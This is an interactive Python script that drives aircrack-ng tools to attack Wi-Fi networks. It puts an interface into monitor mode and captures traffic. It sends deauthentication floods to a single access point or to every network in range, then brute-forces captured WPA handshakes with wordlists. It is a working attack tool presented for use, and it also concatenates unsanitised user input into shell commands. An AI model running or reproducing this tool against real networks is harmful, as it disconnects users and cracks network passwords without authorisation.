import os
import subprocess
import time

CBOLD = '\33[1m'
CGREEN2 = '\33[92m'
os.system('clear')
print(CGREEN2 + CBOLD +"RUN AS SUDO !!!")
os.system('iwconfig')
os.system('airmon-ng check kill')
print("set Interface =")
D_interface = input()
os.system('clear')
stop = "mon"
mon = (D_interface+stop)
while True:
    print(CGREEN2 + CBOLD +"V.0.2 Beta")
    os.system('./banner.sh')
    def menu1():
        os.system('clear')
        os.system('iwconfig')        
        print("Change To monitor Mode ?")
        print("1 for monitor mode")
        print("2 for managed mode")
        print("00 kembali")
        validasi = input()
        interface = (D_interface)
        if validasi == "1":
            print("channel [optional]")
            channel = input()
            command = "airmon-ng start "+interface+" "+channel
            os.system(command)
            os.system('clear')
            print("Sukses monitor mode")
        elif validasi == "2":
            command = "airmon-ng stop "+mon
            os.system(command)
            os.system('clear')
            print("Sukes managed mode")
            pass
        else:
            os.system('clear')
            pass
    def menu2():
        os.system("gnome-terminal -- /bin/bash -c 'airodump-ng "+mon+"; exec bash'")
        os.system('clear')
    def menu3():
        print("Masukan nama Project = ")
        folder = input()
        os.system("mkdir "+folder)
        print("Masukan Bssid = ")
        Bssid = input()
        print("Channel Bssid = ")
        channel = input()
        os.system("gnome-terminal -- /bin/bash -c 'airodump-ng -c "+channel+" --bssid "+Bssid+" --write "+folder+'/'""+folder+" "+mon+"; exec bash'")
    def menu4():
        os.system('clear')
        print("Input BSSID")
        bssid = input()
        print("0 for infinitiy")
        time = input()
        os.system("gnome-terminal -- /bin/bash -c './deauth.sh "+time+" "+bssid+" "+mon+"; exec bash'")
    def menu5():
        print("--Project Folder--")
        os.system("ls -la")
        print("Name Folder Project = ")
        folder = input()
        print("--Wordlist--")
        os.system('ls wordlist')
        #os.system("ls -la")
        print("Name Wordlist = ")
        wordlist = input()
        os.system("gnome-terminal -- /bin/bash -c 'aircrack-ng "+folder+'/'""+folder+'-01.cap'" -w wordlist/"+wordlist+"; exec bash'")
    def menu6():
        os.system("apt update")
        os.system("apt install aircrack-ng")
        os.system("apt install gnome-terminal")
        os.system("apt install crunch")
        os.system("apt install cupp")
        os.system("apt install hashcat")
        print("Done .......")
        time.sleep(5)
        os.system('clear')
    def menu88():
        os.system('clear')
        print("Be Careful !!!")
        print(" 1:  Dump All Network")
        print(" 2:  Convert Dump")
        print(" 3:  eksekusi !!")
        print(" 4:  Crack All")
        print(" 00: Kembali")
        menu = input()
        if menu == "1":
            print("Project name =")
            folder = input()
            os.system("mkdir "+folder)
            os.system("gnome-terminal -- /bin/bash -c 'airodump-ng --write "+folder+'/'""+folder+" "+mon+"; exec bash'")
            os.system('clear')
            menu88()
        elif menu == "2":
            #import get
            exec(open('get.py').read())
            pass
        elif menu == "3":
            exec(open('deauthall.py').read())
            #os.system("gnome-terminal -- /bin/bash -c './deauth.sh "+bssid+" "+mon+"; exec bash'")
            pass
        else:
            os.system('clear')
            pass
    def menu99():
        exit()
          
    print(" Main Menu")
    print(" 1:  Scan interface")
    print(" 2:  Scan Network")
    print(" 3:  Dump Network")
    print(" 4:  Deauth network")
    print(" 5:  Brute Force handShake")
    print(" 6:  Download Required files")
    print(" 88: Gaskeun !!!!")
    print(" 99: Exit")
    print("Pilih Menu :")
    menu = input()
    if menu == "1":
        menu1()
    elif menu == "2":
        menu2()
    elif menu == "3":
        menu3()
    elif menu == "4":
        menu4()
    elif menu == "5":
        menu5()
    elif menu == "6":
        menu6()
    elif menu == "99":
        menu99()
    elif menu == "88":
        menu88()
    else:
        print("Error Input Salah")
        #os.system(exit)
        pass
